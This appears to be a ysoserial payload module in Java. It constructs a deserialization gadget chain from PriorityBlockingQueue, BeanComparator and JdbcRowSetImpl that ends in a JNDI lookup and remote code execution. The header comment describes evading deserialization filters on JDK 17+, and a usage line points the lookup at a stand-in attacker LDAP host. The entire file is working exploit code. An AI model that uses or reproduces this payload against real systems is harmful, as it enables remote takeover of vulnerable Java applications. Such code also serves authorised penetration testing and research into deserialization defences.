package ysoserial.payloads;

import java.io.Serializable;
import java.util.Arrays;
import java.util.Vector;
import java.util.concurrent.PriorityBlockingQueue;

import org.apache.commons.beanutils.BeanComparator;

import com.sun.rowset.JdbcRowSetImpl;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	JNDI sink via PriorityBlockingQueue — no TemplatesImpl, no commons-collections.
	Works on JDK 17+ without --add-opens.

	Gadget chain:
		ObjectInputStream.readObject()
			PriorityBlockingQueue.readObject()
				PriorityBlockingQueue.heapify()
					BeanComparator.compare()
						PropertyUtils.getProperty(jdbcRowSet, "databaseMetaData")
							JdbcRowSetImpl.getDatabaseMetaData()
								JdbcRowSetImpl.connect()
									InitialContext.lookup(dataSourceName)
										JNDI -> LDAP/RMI -> RCE

	Filter evasion:
		1. PriorityBlockingQueue (java.util.concurrent) — not in any filter
		2. No commons-collections in serialized payload
		3. No TemplatesImpl — JDK 17+ without module opens

	Usage: payload arg = JNDI URL
		e.g. "ldap://attacker.com:1389/Exploit"

	Requires:
		commons-beanutils 1.9.x
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.DMBS335 })
public class CommonsBeanutilsJndi4 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String jndiUrl) throws Exception {
		final JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		jdbcRowSet.setDataSourceName(jndiUrl);
		Reflections.setFieldValue(jdbcRowSet, "iMatchColumns",
			new Vector<Integer>(Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(jdbcRowSet, "strMatchColumns",
			new Vector<String>(Arrays.asList("","","","","","","","","","")));

		// safe property during construction
		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

		// PriorityBlockingQueue — concurrent variant
		final PriorityBlockingQueue<Object> queue =
			new PriorityBlockingQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		// arm
		Reflections.setFieldValue(comparator, "property", "databaseMetaData");

		// swap queue contents
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = jdbcRowSet;
		queueArray[1] = jdbcRowSet;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutilsJndi4.class, args);
	}
}
